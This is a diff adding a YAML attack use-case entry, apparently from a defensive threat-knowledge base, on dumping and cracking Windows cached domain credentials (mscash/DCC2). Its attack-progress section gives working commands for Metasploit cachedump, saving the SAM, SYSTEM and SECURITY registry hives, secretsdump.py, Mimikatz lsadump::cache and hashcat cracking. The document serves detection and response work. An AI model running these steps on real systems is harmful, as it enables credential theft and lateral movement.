@@ -1,0 +1,124 @@
+title: 'Dumping and Cracking mscash'
+id: UC0022
+author: 'Alex@Cyberok'
+creation_date: 2023/02/28
+modification_date: 2023/02/28
+severity: M
+tags:
+  - credential_access
+  - attack.t1003.005
+  - windows
+linked_response_playbooks:
+  - RP3002
+linked_artifacts:
+  - A1005
+  - A3002
+  - A5002
+  - A5005
+  - A5008
+description: Credential dumping of cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.
+extended_description: |
+    
+    Mscash is a Microsoft hashing algorithm that is used for storing [cached domain credentials]() locally on a system after a [successful logon](). It's worth noting that cached credentials do not expire. Domain credentials are cached on a [local system]() so that [domain members]() can logon to the machine even if the DC is down. It's worth noting that mscash hash is not passable - i.e [PTH attacks](https://attack.mitre.org/techniques/T1550/002/) will **not work**.
+    
+    Windows caches previous users' logon information locally so that they can log on if a logon server is unavailable during later logon attempts. If a domain controller is unavailable and a user's logon information is cached, the user will be prompted with a dialog that says:
+
+    + A domain controller for your domain could not be contacted. You have been logged on using cached account information. Changes to your profile since you last logged on may not be available.
+    
+    With caching disabled, the user is prompted with this message:
+
+    + The system cannot log you on now because the domain <DOMAIN_NAME> is not available.
+    
+    This is known as Domain Cache credential (DCC) but in-actually it is also known as MSCACHE or MSCASH hash. It uses MSCACHE algorithm for generating password hash and that are stored locally in the [Windows 
+    registry]() of [Windows operating system](). These hashes are stored in the Windows registry, by default the last 10 hashes.
+
+    There two versions of MSCASH/MSCACHE or DCC
+
+    + MSCACHEV1 or DCC1 used before Vista Server 2003
+    + MSCACHEV2 or DCC2 used after Vista & Server 2003
+    
+    Cached logon information is controlled by the following [key]():
+
+    + Location: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version\Winlogon\
+    + Value name: CachedLogonsCount
+    + Data type: REG_SZ
+    + Values: 0 - 50
+    
+    Any changes you make to this key require that you restart the computer for the changes to take effect.
+    
+    ## Attack mapping
+    
+    | ARTIFACT                                                                        | OBJECT                   | DESCRIPTION                                                                               |
+    |---------------------------------------------------------------------------------|--------------------------|-------------------------------------------------------------------------------------------|
+    |  **Attack Prerequisites**                                                       |
+    | [Host](/artifacts/A_1005_host/entity)                                           | Compromised host         | A host to which an attacker has a privileged access      |
+    | [File](/artifacts/A_3002_file/entity/)                                          | Secretdump/Mimikatz      | Depends on used software "file" entity describes either secretdump.py or mimikatz executable file |
+    | [Windows Registry](/artifacts/A_5002_windows_registry/entity)                   | Registry                 | hklm\sam, hklm\system, hklm\security registry hives |
+    | **Side Observables**                                                            |
+    | [File](/artifacts/A_3002_file/entity/)                                          | Registry hives dump      | hklm\sam, hklm\system, hklm\security dumps |
+    | [Encrypted Credential](A_5005_encrypted_credential/entity/)                     | Mscash                   | Credential which can be used for furher dumping and cracking |
+    | [Password](/artifacts/A_5008_password/entity/)                                  | User's password          | Password in plaintext which can be extracted from encrypted credentials  |
+    
+    ## Attack results
+    
+    Extract a [Mscash](/artifacts/A_5005_encrypted_credential/entity) of [domain user](/artifacts/A_1001_windows_domain_account/entity) for further cracking to get user's [password](/artifacts/A_5008_password/entity).
+    
+    | RESOURCE                                                              | DESCRIPTION                                                                               |
+    |-----------------------------------------------------------------------|-------------------------------------------------------------------------------------------|
+    | **Attack Prerequisites**                                              |                                                                                           |
+    | [Privileged Access]()                                                 | Compromised host with privileged access |
+    | **Result Consequences**                                               |                                                                                           |
+    | [Credential Access]()                                                 | In case of successfull hashcrack, attacker get a plaintext password which can be used in next stages of attack, as an example for lateral movement |
+
+    ## Attack progress
+    ### Cachedump
+    1) To dump cached domain credentials in mscash format, use a post exploitation module [**cachedump**](https://attack.mitre.org/software/S0119/):
+    ```
+    getuid
+    getsystem
+    use post/windows/gather/cachedump
+    run
+    ```
+    This hash can be extracted using [python impacket libraries](https://attack.mitre.org/software/S0357/), this required system and security files stored inside the registry. With the help of the following command, you can pull out these files from the registry and save on your local machine.
+    ```
+    reg.exe save hklm\sam c:\temp\sam.save
+    reg save hklm\system c:\system.save
+    reg save hklm\security c:\security.save
+    ```
+    Once the hives are retrieved, they can can be pulled back to kali linux to extract the hashes:
+    ```
+    secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+    ```
+    ![Secretsdump](27.JPG)
+    
+    ### Mimikatz
+    2) Need to download [Mimikatz](https://attack.mitre.org/software/S0002/) (mimikatz.exe & mimilib.dll) into the server. Let's use metasploit to save those in %temp%:
+    ![Mimik](15.JPG)
+    So, we can get DCC2 / MSCACHEv2 hashes using mimikatz by installing it on a compromised host and executing the following commands:
+    ```
+    privilege::debug
+    token::elevate
+    lsadump::cache
+    ```
+    ![Cred](16.JPG)
+    ## Possible usage
+    
+    ### Cracking mscash / mscache with HashCat
+    1) To crack mscache with hashcat, it should be in the following format:
+    ```
+    $DCC2$10240#username#hash
+    ```
+    Let's try cracking it with hashchat now:
+    ```
+    hashcat -m2100 '$DCC2$10240#Administrator#206dd880bb27121182298a0bd8b87d1c' /home/kali/Desktop/passwords.txt --force --potfile-disable
+    ```
+    ![Hashcat1](17.JPG)
+    ![Hashcat2](18.JPG)
+    ## Attack diagram
+    ![Diagram](29.svg)
+    
+    ## References 
+    
+    [Windows 10 – Get Hashes (Domain)](https://vk9-sec.com/windows-10-get-hashes-domain/)
+    
+    
